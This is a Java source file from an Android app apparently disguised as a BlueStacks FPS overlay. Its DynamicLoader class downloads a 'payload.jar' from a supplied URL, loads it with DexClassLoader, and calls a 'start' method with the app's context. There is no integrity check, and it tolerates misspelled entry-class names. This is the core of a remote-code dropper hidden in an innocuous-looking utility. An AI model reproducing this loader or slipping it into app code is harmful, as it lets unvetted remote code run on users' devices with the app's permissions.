package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DynamicLoader {
    private static final String TAG = "DynamicLoader";

    public static void fetchAndExecute(Context context, String jarUrl, final String classNameInput) {
        new Thread(() -> {
            try {
                File internalDir = new File(context.getFilesDir(), "modules");
                if (!internalDir.exists()) internalDir.mkdirs();
                File jarFile = new File(internalDir, "payload.jar");

                // Download only if needed or if requested
                Log.d(TAG, "Downloading payload from: " + jarUrl);
                URL url = new URL(jarUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                try (InputStream is = new BufferedInputStream(conn.getInputStream());
                     FileOutputStream fos = new FileOutputStream(jarFile)) {
                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, read);
                    }
                }
                
                loadLocal(context, classNameInput);

            } catch (Exception e) {
                Log.e(TAG, "Failed to download and load payload: " + e.toString());
            }
        }).start();
    }

    public static void loadLocal(Context context, String classNameInput) {
        try {
            File internalDir = new File(context.getFilesDir(), "modules");
            File jarFile = new File(internalDir, "payload.jar");

            if (!jarFile.exists()) {
                Log.e(TAG, "Local payload file not found at: " + jarFile.getAbsolutePath());
                return;
            }

            Log.d(TAG, "Loading local DEX from: " + jarFile.getAbsolutePath());
            
            String className = classNameInput;
            if (className.endsWith(".PayloadEntery") || className.endsWith(".PayloadEmtry")) {
                className = className.substring(0, className.lastIndexOf(".")) + ".PayloadEntry";
            }

            DexClassLoader loader = new DexClassLoader(
                jarFile.getAbsolutePath(),
                internalDir.getAbsolutePath(),
                null,
                context.getClassLoader()
            );

            Class<?> clazz = loader.loadClass(className);
            Object instance = clazz.newInstance();
            clazz.getMethod("start", Context.class).invoke(instance, context);
            
            Log.i(TAG, "Local Payload started successfully!");

            if (context instanceof SupportService) {
                ((SupportService) context).updateSystemStatus();
            }

        } catch (Exception e) {
            Log.e(TAG, "Failed to load local payload: " + e.toString());
        }
    }
}
